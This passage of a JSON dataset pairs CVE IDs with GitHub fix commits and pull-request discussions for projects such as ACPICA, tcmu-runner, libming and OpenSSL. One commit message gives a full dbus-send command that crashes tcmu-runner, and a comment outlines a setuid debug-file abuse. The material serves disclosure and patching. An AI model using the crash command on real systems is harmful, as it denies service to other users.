            "other_info": "acpi: acpica: fix acpi operand cache leak in dsutils.c This looks like a slight issue that can be detected by coverity tools.\r\n\r\nIt looks AcpiDsObjStackPopAndDelete() only wants to revert what has been done in AcpiDsCreateOperands(). So can you fix the caller - AcpiDsCreateOperands()? Hello, Lv.\r\n\r\nAccording to your comment, I changed the caller, AcpiDsCreateOperands() and pushed again.\r\nPlease check my revised commit, https://github.com/acpica/acpica/pull/295/commits/987a3b5cf7175916e2a4b6ea5b8e70f830dfe732 .\r\n\r\nI tested it in my PC, and confirmed it works fine.\r\nIf you have any request, please let me know.\r\n\r\nBest regards.\r\nSeunghun.\r\n I'm wondering what exactly you mean by \"malicious ACPI table\"\r\n Hello, Robert.\r\n\r\nI have been researching on ACPI table and I assume that some malicious users can change the table using initrd.gz, firmware flashing, etc.\r\n\r\nAs you know, these attacks are well-known in security and I have been analyzing the effect of those attacks.\r\n\r\nBest regards.\r\n\r\nSeunghun. Hello, @timofonic .\r\n\r\nI consider that ACPI table tampering by a malicious user and ACPI table tampering by a malicious user are the same. Because they can make memory information leaks and these vulnerabilities could neutralize security features in the system.\r\n\r\nI have been cooperating with Intel for several months and I hope this patch is merged soon.\r\n\r\nBest regards.\r\n\r\nSeunghun. Is there any probability of this patch being merged?  It does appear to resolve a known, public security issue (CVE-2017-13693) yet it has stalled.  Two other pull requests (#295 and #296) are in exactly the same situation.\r\n\r\nIf these patches are not to be applied as they are, what would be needed to correct them?\r\n\r\nThanks.  Hello, Timofonic.\n\nACPI table has essential information and executable code, ASL.\n\nSo security researchers and attackers are interested in ACPI table and use\nit to do something malicious.\n\nThis is ACPI tampering.\n\nIf you have any request,\nplease let me know.\n\nBest regards.\n\nSeunghun.\n\n2018. 2. 6. \uc624\ud6c4 11:58\uc5d0 \"Timofonic\" <notifications@github.com>\ub2d8\uc774 \uc791\uc131:\n\n@kkamagui <https://github.com/kkamagui> I'm sorry. It seems I didn't\nunderstand the mean of this fix. What do you mean by \"ACPI table\ntampering\"? Excuse me for my ignorance!\n\n@ahs3 <https://github.com/ahs3> It would be nice if it fixed security\nissues, indeed.\n\n@acpibob <https://github.com/acpibob> ACPI Master, any news? ;)\n\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\n<https://github.com/acpica/acpica/pull/295#issuecomment-363447801>, or mute\nthe thread\n<https://github.com/notifications/unsubscribe-auth/ABIObnKj2TgwpzagXx4ZBh1a46nstlGeks5tSGicgaJpZM4OcXF0>\n.\n Hi.\r\n\r\nFinally, I made a tool which can reproduce this memory leak report.\r\nPlease check my github below and your email.\r\nhttps://github.com/kkamagui/acpica/tree/linux_kernel_app\r\n\r\nI hope that my tool helps you.\r\nIf you have any further question, please let me know.\r\n\r\nBest regards. Looks good to me Hi all, \r\n\r\nWhy this patch still not be merged to mainline. Does there have any concern of this patch?\r\n\r\nThanks! I have filed a acpica bug against this CVE-2017-13693 patch:\r\nhttps://bugs.acpica.org/show_bug.cgi?id=1549\r\n\r\nemail:\r\nhttps://lists.acpica.org/hyperkitty/list/devel@acpica.org/thread/CZX3DW4ZFEDCU76FCMGGWOPCZGDQSTBQ/ Is there still any interest in this patch? I can take it and merge it if that is what the majority prefers, after all the CVE exploits are no ordinary bugs to be ignored.....  > Is there still any interest in this patch? I can take it and merge it if that is what the majority prefers, after all the CVE exploits are no ordinary bugs to be ignored.....\r\n\r\nIt will be good if you can take the patch. Per my understood, this patch can fix CVE-2017-13693 which relates to KASLR. Any distro who enabled KASLR should cares it. > > Is there still any interest in this patch? I can take it and merge it if that is what the majority prefers, after all the CVE exploits are no ordinary bugs to be ignored.....\r\n> \r\n> It will be good if you can take the patch. Per my understood, this patch can fix [CVE-2017-13693](https://github.com/advisories/GHSA-8xw3-8jcr-ch76) which relates to KASLR. Any distro who enabled KASLR should cares it.\r\n\r\nWhat about PR #278 from the same author? Any comments on that or interest in general? > > > Is there still any interest in this patch? I can take it and merge it if that is what the majority prefers, after all the CVE exploits are no ordinary bugs to be ignored.....\r\n> > \r\n> > \r\n> > It will be good if you can take the patch. Per my understood, this patch can fix [CVE-2017-13693](https://github.com/advisories/GHSA-8xw3-8jcr-ch76) which relates to KASLR. Any distro who enabled KASLR should cares it.\r\n> \r\n> What about PR #278 from the same author? Any comments on that or interest in general?\r\n\r\nLooks PR #278 is similar with #295. Both of them can trigger stack dump to show kernel memory location (<= 4.9) when booting for neutralizing KASLR (CVE-2017-13694).  So my suggestion is that you can also take it. Thanks for the detailed response, I can merge them both if there are no conflicts! I can also update the CVE reports.  Fixed warnings related to UINT32 -> UINT8 conversion which could result in possible data loss.",
            "pr_title_words": 9,
            "comments_words": 801,
            "total_other_info_words": 810
        },
        {
            "cve-id": "CVE-2017-6952",
            "commit_url": "https://github.com/capstone-engine/capstone/commit/6fe86eef621b9849f51a5e1e5d73258a93440403",
            "commit_msg": "provide a validity check to prevent against Integer overflow conditions (#870)\n\n* provide a validity check to prevent against Integer overflow conditions\r\n\r\n* fix some style issues.",
            "commit_msg_words": 27,
            "other_info": "[pull] master from capstone-engine:master",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2017-1000201",
            "commit_url": "https://github.com/open-iscsi/tcmu-runner/commit/e2d953050766ac538615a811c64b34358614edce",
            "commit_msg": "fixed local DoS when UnregisterHandler was called for a not existing handler\n\nAny user with DBUS access could cause a SEGFAULT in tcmu-runner by\nrunning something like this:\n\ndbus-send --system --print-reply --dest=org.kernel.TCMUService1 /org/kernel/TCMUService1/HandlerManager1 org.kernel.TCMUService1.HandlerManager1.UnregisterHandler string:123",
            "commit_msg_words": 35,
            "other_info": "Rebased: Various security and functionality related bugfixes (multiple DoS, memory leaks) Hi @mgerstner ,\r\nI was discussing the criticality of this issue with @sidhax and we are wondering if you have raised any CVE for the security issue on this ? Actually that was something I wanted to ask you about, too. I have not requested any CVE yet. \r\n\r\nI think commit 8cf8208775022301adaa59c240bb7f93742d1329 justifies a CVE, because of the information leak as described in issue #194.\r\n\r\nThe memory leaks and denial of service issues from commits\r\n\r\n7a78eda52d973d3edc06fea84ad874678d6055f0\r\nbb80e9c7a798f035768260ebdadffb6eb0786178\r\ne2d953050766ac538615a811c64b34358614edce\r\n\r\nare minor issues, but mostly they're also assigned CVEs for easier tracking by other distros.\r\n\r\nDo you have a workflow for this? I can request the CVEs for you if you like. @mgerstner can you please file request for CVEs ? Also for https://github.com/open-iscsi/tcmu-runner/commit/8cf8208775022301adaa59c240bb7f93742d1329 I think its more of secure coding. It cannot read contents of file as per my understanding. Dbus output only returns true or false, would you still consider this a security flaw ? Also other 3 commits are for local dos so attacker would already need shell to to trigger local dos. @sidhax: Okay I will request CVEs and report back when they're assigned.\r\n\r\nNo you can't read file content but it still gives you some information that would otherwise not be available like what files are existing in /root. There could be situations, combined with other security issues in other software, when this can lead to exploits.\r\n\r\nWorse is the example code in file_example_c, by the way. It allows to create arbitrary empty files for a short time, making it possible for example to create /etc/suid-debug just in time for some suid binary to run in debug mode. There could be other possibilities like creating things via /sys. I hope nobody used this example code for their own handlers.\r\n\r\nThe DoS are only local yes. But a non-root user can DoS a service running as root. Or leak memory.\r\n\r\nNothing critical altogether but let's give users of tcmu-runner a chance to recognize these issues and backport them if they deem it necessary. @mgerstner Make sense to me, Thanks :-) @mgerstner sorry! you may have to drop https://github.com/open-iscsi/tcmu-runner/pull/200/commits/b0beac3a490092c7c202dc4fb0bbaa7af09bb10d as https://github.com/open-iscsi/tcmu-runner/pull/199 is closed Okay I've rebased, dropped the conflicting commit > @mikechristie\r\nShould we wait till open-iscsi/targetcli-fb#87 gets merged and available ?\r\n\r\nI don't know.\r\n\r\nI have been debating that. It will also require users to upgrade to the 4.13 kernel and that is around rc1 stage right now.\r\n\r\nThe thing is that with the removal of the check_config code, I think we can just delete all the dbus code since it does nothing now as far as I can tell. For this we would also need to sync up with targetcli releases. It's code to connect to dbus will fail during device setup, so existing setups would fail if they updated runner, but not targetcli.\r\n\r\nMaybe, we could say for the next runner release you must use 4.13 and targetcli-fb XYZ? Here is one additional fix up we will need for these patches. When we would exit() from the signal handler, the code after the g_main_run would not get run normally. With the patch to use g_main_quit, we cannot use the logger after the signal handler has killed the logger threads. It also moves the cancel_log_thread call to after the config cancel incase the config shutdown code tries to log something.\r\n\r\n[0001-runner-fix-log-use-during-shutdown.txt](https://github.com/open-iscsi/tcmu-runner/files/1163654/0001-runner-fix-log-use-during-shutdown.txt) One update:\r\n\r\nI have emailed the targetcli maintainer about trying to coordinate check_config and dbus removal. When that is done I will merge these patches. @mikechristie: do you want me to add the logging patch to this pull request? I can add an additional commit but want to avoid another rebase, because I've already used the commit URLs in CVE requests and bugzilla tickets. @mikechristie: we could also think about cancelling the log thread not in the signal handler but at the end of the main() function. This would make for a smaller patch and logging could be used without worries about shutdown situations. No, you do not need to carry the patch. I will merge it when I merge you PR.\r\n\r\nAs far as doing the canceling in the sig handler or end of the main function, it does not matter to me where it goes. Is there any place where it is more common? It would be best to do both the config and log cancel calls in the same place, just so it is consistent. Here's the plan.\r\n\r\n1. I am going to merge this set as is even though some patches will not be necessary when the dbus code is removed.\r\n2. Andy (targetcli/rtslib -fb maintainer) will help us coordinate a release.\r\n3. In another PR we will remove the dbus code. FTR:\r\n\r\n- CVE requests are still pending\r\n- I've posted a summary on the oss-security mailing list: http://www.openwall.com/lists/oss-security/2017/07/24/1 I've got most of the CVEs via [DWF](https://github.com/distributedweaknessfiling/) now:\r\n\r\n- CVE-2017-1000198 for DoS in the GLFS handler which was removed in commit 61bd03e600d2abf309173e9186f4d465bb1b7157\r\n- CVE-2017-1000199 for information leak in qcow handler as reported in issue #194\r\n- CVE-2017-1000200 for DoS fixed in commit bb80e9c7a798f035768260ebdadffb6eb0786178\r\n- CVE-2017-1000201 for DoS fixed in commit e2d953050766ac538615a811c64b34358614edce\r\n\r\na CVE for the memory leaks fixed in commit 7a78eda52d973d3edc06fea84ad874678d6055f0 is still pending.",
            "pr_title_words": 11,
            "comments_words": 863,
            "total_other_info_words": 874
        },
        {
            "cve-id": "CVE-2017-11574",
            "commit_url": "https://github.com/fontforge/fontforge/commit/62b6433a81ee7ed6e0ac2d6b09ac85b885046ac3",
            "commit_msg": "parsettf.c: Fix buffer overrun condition\n\nCloses #3090",
            "commit_msg_words": 7,
            "other_info": "Fix a few cves Just in time. I'm cutting a release tomorrow. I'll review as soon as I get a chance.\r\n I made one inline comment/query. It otherwise looks fine.\r\n All good.",
            "pr_title_words": 4,
            "comments_words": 28,
            "total_other_info_words": 32
        },
        {
            "cve-id": "CVE-2017-9431",
            "commit_url": "https://github.com/grpc/grpc/commit/c6ec1155d026c91b1badb07ef1605bb747cff064",
            "commit_msg": "Fix error overflow bug",
            "commit_msg_words": 4,
            "other_info": "Fix Error Overflow Bug This fixes: https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=1018 ```\nNo significant performance differences\n``` ```\nNo significant performance differences\n``` Failures: #9804, Docker python flake",
            "pr_title_words": 4,
            "comments_words": 20,
            "total_other_info_words": 24
        },
        {
            "cve-id": "CVE-2017-6309",
            "commit_url": "https://github.com/verdammelt/tnef/commit/8dccf79857ceeb7a6d3e42c1e762e7b865d5344d",
            "commit_msg": "Check types to avoid invalid reads/writes.",
            "commit_msg_words": 6,
            "other_info": "Release 1.4.13",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2017-16898",
            "commit_url": "https://github.com/libming/libming/commit/6032557a21e4dac8bb2606bb5b58e27d85a7ff98",
            "commit_msg": "Fix global buffer overflow in printMP3Headers.\n\nThe printMP3Headers function in util/listmp3.c processes mp3 files\nwithout checking their bitrate values. This leads to bitrate_idx = 15\nbeing used as index in mp2l23_bitrate_table[bitrate_idx] while\nmp2l23_bitrate_table has only 14 elements.\n\nIn this commit we add a check rejecting mp3 files declaring invalid\nbitrates.\n\nThis commit fixes CVE-2017-16898 (fixes: #75).",
            "commit_msg_words": 56,
            "other_info": "Fix global buffer overflow in printMP3Headers (CVE-2017-16898) Merged, although I wonder if the parser is correct in interpreting\nthat number.. (why should 15 be not valid ?)\n\nmp2l23_bitrate_table has a size of 15, but ofc when used as an offset\nthe index should start at 0. Could it be it just needs to be\ndecremented by 1 before used as an index ?\n Hum, I guess the parser is perfectly correct in interpreting that number now. In fact, the MP3 specification declares bitrate = 15 as an invalid value (explained [here](https://www.mp3-tech.org/programmer/frame_header.html) for example).\r\n\r\nBut, you're right Sandro, my commit/PR messages weren't clear enough, and I even made a mistake:\r\n\r\n> mp2l23_bitrate_table has size 14\r\n\r\nshould be\r\n\r\n> mp2l23_bitrate_table has size 15\r\n\r\nAm I missing something ? nothing missing, thanks for the reference!",
            "pr_title_words": 7,
            "comments_words": 125,
            "total_other_info_words": 132
        },
        {
            "cve-id": "CVE-2017-16927",
            "commit_url": "https://github.com/neutrinolabs/xrdp/commit/ebd0510a7d4dab906b6e01570205dfa530d1f7bf",
            "commit_msg": "sesman: scpv0, accept variable length data fields",
            "commit_msg_words": 7,
            "other_info": "sesman: scpv0, accept variable length data fields [CVE-2017-16927](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16927) LGTM @jsorg71 are you ok with this? +1 As reported in Debian, this patch is broken because `g_new0(char, sz)` reserves `sz` bytes and `buf[sz] = '\\0'` in turn writes behind the buffer, corrupting memory.",
            "pr_title_words": 7,
            "comments_words": 35,
            "total_other_info_words": 42
        },
        {
            "cve-id": "CVE-2017-15088",
            "commit_url": "https://github.com/krb5/krb5/commit/fbb687db1088ddd894d975996e5f6a4252b9a2b4",
            "commit_msg": "Fix PKINIT cert matching data construction\n\nRewrite X509_NAME_oneline_ex() and its call sites to use dynamic\nallocation and to perform proper error checking.\n\nticket: 8617\ntarget_version: 1.16\ntarget_version: 1.15-next\ntarget_version: 1.14-next\ntags: pullup",
            "commit_msg_words": 32,
            "other_info": "Fix PKINIT cert matching data construction Red Hat has assigned this CVE-2017-15088 (in our builds only, not in upstream krb5). On self-review I noticed some minor exception-handling mistakes in the new function definition (memory leaks on error, not checking the return value of BIO_new()).  Please re-review.  I think the candidate fix should be okay for practical purposes. Right, this is better than the original, so +1.\r\n\r\n(I believe `BIO_new()` failures aren't realistic for Linux, and the BIO leak on error isn't worth the delay a respin would require, so I agree it's fine for what I'm doing with it, and I'll plan to fix that later.)",
            "pr_title_words": 6,
            "comments_words": 100,
            "total_other_info_words": 106
        },
        {
            "cve-id": "CVE-2017-9780",
            "commit_url": "https://github.com/flatpak/flatpak/commit/aed5d0919830c02e490f669fc36bd9af42e632d6",
            "commit_msg": "Use new libostree APIs to reject world-writable/suid content\n\nThis uses the new libostree APIs that landed recently to ensure\nthat we reject any files with mode outside of `0775` for system\nhelper pulls, and we also mask directory modes during checkout.\n\nHowever, this does *not* fix up any already downloaded content.\nFor that, one could uninstall/reinstall; or a future patch could\ndo a one-time fixup pass.\n\nNote that I am not aware of a way for flatpak applications to escalate their\nprivileges directly with this flaw; the bubblewrap `PR_SET_NO_NEW_PRIVS` turns\nof setuid. However, in combination with code execution on the host via another\nmechanism (e.g. unsandboxed app), a setuid app injected could be used to gain\nfull host privileges.\n\nAt this time we're not aware of any flatpak content exploiting this issue.\n\nCloses: https://github.com/flatpak/flatpak/issues/845",
            "commit_msg_words": 134,
            "other_info": "system-helper: Use new ostree APIs to reject world-writable/suid content Side note; I found it double plus confusing that the system helper path actually wasn't using `flatpak_dir_pull_untrusted_local()`...why does the code try to distinguish between \"local repo\" and `file:///` URI?  In libostree they should be the same thing. Also something I'm not entirely sure of is the appstream stuff; we appear to be doing pulls for that too that go through separate paths?  It *is* using flatpak_dir_pull_untrusted_local(). There are two codepaths here. \r\n\r\nOne is the case where the system repo has a remote configured with a file: uri. In this case we just do the pull entierly in the system helper. This is the codepath your current patch has implemented.\r\n\r\nThe other case is where the remote has a non-local uri, but the app already downloaded this to a separate local directory, which is specified with arg_repo_path. In this case we're using flatpak_dir_pull_untrusted_local(). The current patch doesn't handle this case.\r\n\r\nThese are not the same, because in one case the sysadmin defined a pathname as \"trusted\" by configuring a remote at that location. In the second case the caller (who is untrusted) passes in the directory in which to read the files from, and we have to be much more careful about what we pull from this. \r\n\r\nFor the appstream we're pulling in the same way as for app, but the deploy is different (because the checkout is to a different location). This looks fine in the patch. Ah, and because I was testing this with a \"local\" remote from a locally built app I ended up in the other path.  OK.\r\n\r\nI actually did patch `flatpak_dir_pull_untrusted_local()` though.  That's what I tried first and was really confused when it didn't work.\r\n Or in other words, the patch is correct? Oh, lemme check.\r\nIt needs a configure check for the new ostree version though. Ah, yes. It is correct. However, i would like you to also pass that flag in repo_pull_one_dir, so we get nice warnings about this earlier in the process (and for --user installs). Let's land https://github.com/flatpak/flatpak/pull/849 first. Like that :arrow_up:  ? > error: Can't use bareuseronly-files with non-local origin repo\r\n\r\nAh, yes.  Mrm.  I had originally designed this only for the system helper but perhaps it's better to support it for HTTP pulls too.  Will make a change in libostree.\r\n Now depends on https://github.com/ostreedev/ostree/pull/930 I guess you can rebase this on master now. Done. :surfing_man:  OK, let's give things a day or two at least in git master and do releases?",
            "pr_title_words": 9,
            "comments_words": 412,
            "total_other_info_words": 421
        },
        {
            "cve-id": "CVE-2017-0152",
            "commit_url": "https://github.com/chakra-core/ChakraCore/commit/9da019424601325a6e95e6be0fa03d7d21d0b517",
            "commit_msg": "[CVE-2017-0152] MSFT: 10592731 : Issue with Function name capturing in param scope\n\nIn a function expression with name, where the name is captured in one\nof the param scope functions, if there is a function or var declaration\nwith the same name as the function expression name we were marking the\nfunction expression name as shadowed. In non-eval case this causes\nissue because the name symbol won't get added to the body. This change is to\nfix it in such a way if the name is captured in the param scope then we\nsplit the param and body scope such that the name symbol is added to the\nparam scope not body scope.",
            "commit_msg_words": 113,
            "other_info": "17-03 ChakraCore servicing release @Cellule @Penguinwizzard @agarwal-sandeep @tcare @pleath @akroshg @aneeshdk @suwc @leirocks FYI My 2 commits look good. LGTM. LGTM LGTM LGTM LGTM",
            "pr_title_words": 4,
            "comments_words": 20,
            "total_other_info_words": 24
        },
        {
            "cve-id": "CVE-2017-0028",
            "commit_url": "https://github.com/chakra-core/ChakraCore/commit/402f3d967c0a905ec5b9ca9c240783d3f2c15724",
            "commit_msg": "[CVE-2017-0028] Fix binding of 'async' identifier in the presence of async arrow function.",
            "commit_msg_words": 13,
            "other_info": "17-03 ChakraCore servicing release @Cellule @Penguinwizzard @agarwal-sandeep @tcare @pleath @akroshg @aneeshdk @suwc @leirocks FYI My 2 commits look good. LGTM. LGTM LGTM LGTM LGTM",
            "pr_title_words": 4,
            "comments_words": 20,
            "total_other_info_words": 24
        },
        {
            "cve-id": "CVE-2017-6429",
            "commit_url": "https://github.com/appneta/tcpreplay/commit/d689d14dbcd768c028eab2fb378d849e543dcfe9",
            "commit_msg": "#278 fail if capture has a packet that is too large (#286)\n\n* #278 fail if capture has a packet that is too large\r\n\r\n* Update CHANGELOG",
            "commit_msg_words": 27,
            "other_info": "#278 fail if capture has a packet that is too large",
            "pr_title_words": 11,
            "comments_words": 0,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2017-17760",
            "commit_url": "https://github.com/opencv/opencv/commit/7bbe1a53cfc097b82b1589f7915a2120de39274c",
            "commit_msg": "imgcodecs(pxm): fix memcpy size",
            "commit_msg_words": 4,
            "other_info": "imgcodecs(pxm): fix memcpy size :+1: CVE-2017-17760 issue. any plan for backporting into 2.4?",
            "pr_title_words": 4,
            "comments_words": 9,
            "total_other_info_words": 13
        },
        {
            "cve-id": "CVE-2017-16818",
            "commit_url": "https://github.com/ceph/ceph/commit/b3118cabb8060a8cc6a01c4e8264cb18e7b1745a",
            "commit_msg": "rgw: Remove assertions in IAM Policy\n\nA couple of them could be triggered by user input.\n\nSigned-off-by: Adam C. Emerson <aemerson@redhat.com>",
            "commit_msg_words": 21,
            "other_info": "rgw: Remove assertions in IAM Policy ![](https://github.trello.services/images/mini-trello-icon.png) [wip-yuri-testing-2017-10-10-2113](https://trello.com/c/6grUQb1g/176-wip-yuri-testing-2017-10-10-2113) @adamemerson @mattbenjamin this should be making it back to Luminous as well right? luminous backport: https://github.com/ceph/ceph/pull/18287",
            "pr_title_words": 6,
            "comments_words": 18,
            "total_other_info_words": 24
        },
        {
            "cve-id": "CVE-2017-6800",
            "commit_url": "https://github.com/Yeraze/ytnef/commit/f98f5d4adc1c4bd4033638f6167c1bb95d642f89",
            "commit_msg": "BugFix - data length\n\nEven tho this is a \"LONG\" type, it's actually only 4 bytes. Typecasting\nit to a long* caused a dereference beyond the end of the allocated\nregion.\n\nissues#28",
            "commit_msg_words": 32,
            "other_info": "BugFix - data length error The long -> int change looks reasonable to me, but I don't consider my C knowledge to be too good to actually act as a reviewer ;) \r\n\r\nWhat I do notice is the lack of warning reporting in general. You should use -Wall at the very least. In Debian I actually add -Wextra as well and the result is... interesting. Fedora has patches to silence all of these.  I do that myself regularly as a first-step static analysis (and I run cppcheck regularly).  All I see is some rather harmless 'unused parameters' and 'comparing int & unsigned int' warnings, nothing I consider too harmful.\r\n\r\nAre you seeing something more serious? Finally, these two new issues could probably get additional CVE numbers. I requested the others for you and can do these two as well, but you can do it using the mitre web form at https://cveform.mitre.org/ Re: warnings, no. It's just I'm unused to seeing a project not using at least -Wall. I'm unsure if any of them are actually potentially dangerous or can cause problems.",
            "pr_title_words": 5,
            "comments_words": 176,
            "total_other_info_words": 181
        },
        {
            "cve-id": "CVE-2017-11728",
            "commit_url": "https://github.com/libming/libming/commit/2027b24f403a859016a70bbdc79a8da1d6f128eb",
            "commit_msg": "Fix various overflows in OpCode and readBytes\n\n* OpCode: Add a check to avoid reading the stack when n < 1\n\n    In this case, print a debug warning and return error code -998\n\n* readBytes: When size < 0, set it to zero (don't read anything)\n\nThis commit fixes CVE-2017-11728 (Fixes #82), CVE-2017-11729 (Fixes #79),\nCVE-2017-11730 (Fixes #81) and CVE-2017-11731 (Fixes #84).",
            "commit_msg_words": 62,
            "other_info": "Fix various overflows in OpCode and readBytes Applying this patch will also fix CVE-2017-11731 (#84) :+1:  Would you mind including \"Fixes #xx\" \"Fixes #yy\" etc. in the commit log so the relevant tickets are automatically closed on merge ? Also please add an entry in the NEWS file so there's nothing else for me to do other than merging :)\r\n\r\nThanks!  > \ufffc\ufffc\ufffc\ufffc\ufffc\ufffc\ufffc\ufffc\ufffc\ufffc\ufffc\ufffc\ufffc\ufffc\ufffcWould you mind including \"Fixes #xx\" \"Fixes #yy\" etc. in the commit log so the relevant tickets are automatically closed on merge ? Also please add an entry in the NEWS file so there's nothing else for me to do other than merging :)\r\n\r\nCommit updated :) Thanks !",
            "pr_title_words": 7,
            "comments_words": 104,
            "total_other_info_words": 111
        },
        {
            "cve-id": "CVE-2017-3733",
            "commit_url": "https://github.com/openssl/openssl/commit/4ad93618d26a3ea23d36ad5498ff4f59eff3a4d2",
            "commit_msg": "Don't change the state of the ETM flags until CCS processing\n\nChanging the ciphersuite during a renegotiation can result in a crash\nleading to a DoS attack. ETM has not been implemented in 1.1.0 for DTLS\nso this is TLS only.\n\nThe problem is caused by changing the flag indicating whether to use ETM\nor not immediately on negotiation of ETM, rather than at CCS. Therefore,\nduring a renegotiation, if the ETM state is changing (usually due to a\nchange of ciphersuite), then an error/crash will occur.\n\nDue to the fact that there are separate CCS messages for read and write\nwe actually now need two flags to determine whether to use ETM or not.\n\nCVE-2017-3733\n\nReviewed-by: Richard Levitte <levitte@openssl.org>",
            "commit_msg_words": 120,
            "other_info": "Open ssl 1 1 0 stable Fixed the above nits, and removed ifdefs for OPENSSL_NO_SERVERINFO.\n\nRegarding the FIXME in ssl_rsa.c: it would be possible to do extra checking for known types, like SignedCertificateTimestamps, but you could probably do that more easily than me.\n\nNote that OPENSSL_NO_TLSEXT doesn't actually compile (not the fault of this patch), and the 5878 authz code is still left in.  These things should probably change, I'd be happy to work on them after this gets in. \n Merged, with modifications.",
            "pr_title_words": 6,
            "comments_words": 77,
            "total_other_info_words": 83
        },
        {
            "cve-id": "CVE-2017-11569",
            "commit_url": "https://github.com/fontforge/fontforge/commit/7bfec47910293bf149b8debe44c6f3f788506092",
            "commit_msg": "parsettf.c: Fix out of bounds read condition on buffer\n\nCloses #3093",
            "commit_msg_words": 11,
            "other_info": "Fix a few cves Just in time. I'm cutting a release tomorrow. I'll review as soon as I get a chance.\r\n I made one inline comment/query. It otherwise looks fine.\r\n All good.",
            "pr_title_words": 4,
            "comments_words": 28,
            "total_other_info_words": 32
        },
        {
            "cve-id": "CVE-2017-7394",
            "commit_url": "https://github.com/TigerVNC/tigervnc/commit/9801c5efcf8c1774d9c807ebd5d27ac7049ad993",
            "commit_msg": "Fix checkNoWait logic in SSecurityPlain.\n\nCurrently it proceeds only if there aren't enough data in queue and then it blocks waiting.\nAlso the required amount to receive from network is (ulen + plen), not (ulen + plen + 2).\n\nThis allowed not authenticated clients to deny service to everyone.",
            "commit_msg_words": 49,
            "other_info": "Fixes ssecurityplain I don't see where those two extra bytes are read. I see one `readBytes()` for `ulen`, and one for `plen`. So the existing code looks correct? The original code was:\r\n\r\n    if (is->checkNoWait(ulen + plen + 2))\r\n\r\nIt was missing the negation, so I corrected it to:\r\n\r\n    if (!is->checkNoWait(ulen + plen + 2))\r\n\r\nAnd I created the pull request. But then I noticed that the formula is also incorrect so I removed the + 2:\r\n\r\n    if (!is->checkNoWait(ulen + plen))\r\n\r\nNow I believe it is correct. I have modified the commit while it was waiting for pull, which is probably what caused the confusion, sorry about that. Ah. I managed to look at the diff backwards somehow. I'll blame it on it being late here. ;) This has been assigned CVE-2017-7394",
            "pr_title_words": 2,
            "comments_words": 129,
            "total_other_info_words": 131
        },
        {
            "cve-id": "CVE-2017-6307",
            "commit_url": "https://github.com/verdammelt/tnef/commit/1a17af1ed0c791aec44dbdc9eab91218cc1e335a",
            "commit_msg": "Use asserts on lengths to prevent invalid reads/writes.",
            "commit_msg_words": 8,
            "other_info": "Release 1.4.13",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2017-11704",
            "commit_url": "https://github.com/libming/libming/commit/7fed314748be817c7ded84854acb649786625cb6",
            "commit_msg": "Fix various overflows in util/ (CVE-2017-11704)\n\n* Add a check in decompileIF to avoid overflows.\n\n    Avoid processing block when sact->numActions is 0, as\n    sact->numActions - 1 may be used as index when accessing\n    sact->Actions array.\n\n* Fix overflow in readUInt32.\n\n    o Fix declaration of readUInt32 and readSInt32 in util/read.h:\n      return types should be unsigned long and long.\n    o readUInt32: Avoid calling all readUInt8(f) in one line, order of\n      evaluation is not guaranteed in the C standard.\n    o readUInt32: Cast result of readUInt8(f) before << 24 to avoid\n      overflow.\n\n* Fix overflow in readMovie.\n\n    length has int type but according to the specification it should be able\n    to store unsigned 32bit numbers. Instead of changing the type of\n    length, which would be a major refactoring, we verify that the value\n    returned by readUInt32 is smaller than INT_MAX and update length if\n    it's the case. Otherwise we print a warning and ignore the block.\n\nThis commit fixes CVE-2017-11704.",
            "commit_msg_words": 156,
            "other_info": "Fix various overflows in util/ (CVE-2017-11704) Also, fix overflow in `readUInt32`.\r\n\r\n* Fix declaration of `readUInt32` and `readSInt32` in `util/read.h`: return types should be unsigned long and long.\r\n* readUInt32: Avoid calling all `readUInt8(f)` in one line, order of evaluation is not guaranteed in the C standard.\r\n* readUInt32: Cast result of `readUInt8(f)` before `<< 24` to avoid overflow. Do you plan to add more fixes to completely address CVE-2017-11704\nbefore I merge ?\n You should be able to get a successful travis build by rebasing to current master Fine, rebase fixed travis build.\r\n\r\nYes, I am planning to add more fixes to completely address CVE-2017-11704 if possible. Hum, I've looked into changing the type of `length` from `int` to `unsigned long`, but I'm not sure it's the right solution. This looks like a major refactoring and since I'm preparing the fix in sight of a Debian LTS security update, this is not exactly what I want.\r\n\r\nWhat about simply declaring length > `INT_MAX` unsupported ? This is already quite big (especially when `sizeof(int)` = 4) and could be a temporary solution. And, anyway, it would still be better than what we have now. In this case I'd suggest something like\r\n\r\n```\r\ndiff --git a/util/main.c b/util/main.c\r\nindex cb277804..923d4c75 100644\r\n--- a/util/main.c\r\n+++ b/util/main.c\r\n@@ -253,7 +253,16 @@ static void readMovie(FILE *f)\r\n                {\r\n                        if(filelen_check_fails(4))\r\n                                break;\r\n-                       length = readUInt32 (f);\r\n+                       unsigned long real_length = readUInt32 (f);\r\n+\r\n+                        if (real_length > INT_MAX) {\r\n+                           SWF_warn(\" Could not process long block with length %lu:\"\r\n+                                     \" blocks with length > %d not supported on this system\\n\",\r\n+                                     real_length, INT_MAX);\r\n+                            continue;\r\n+                        } else {\r\n+                            length = (int) real_length;\r\n+                        }\r\n                }\r\n                \r\n                //      printf (\"Found Block: %s (%i), %i bytes\\n\", blockName (type), type, length);\r\n``` I have updated the PR to ship previously discussed patch. This PR should completely address CVE-2017-11704. Thank! Merged.",
            "pr_title_words": 6,
            "comments_words": 307,
            "total_other_info_words": 313
        },
        {
            "cve-id": "CVE-2017-11577",
            "commit_url": "https://github.com/fontforge/fontforge/commit/3245d354865def9d712bdffe61fa211ad6aa4081",
            "commit_msg": "Fix out of bounds read in getsid\n\nCloses #3088",
            "commit_msg_words": 9,
            "other_info": "Fix a few cves Just in time. I'm cutting a release tomorrow. I'll review as soon as I get a chance.\r\n I made one inline comment/query. It otherwise looks fine.\r\n All good.",
            "pr_title_words": 4,
            "comments_words": 28,
            "total_other_info_words": 32
        },
        {
            "cve-id": "CVE-2017-7418",
            "commit_url": "https://github.com/proftpd/proftpd/commit/349addc3be4fcdad9bd4ec01ad1ccd916c898ed8",
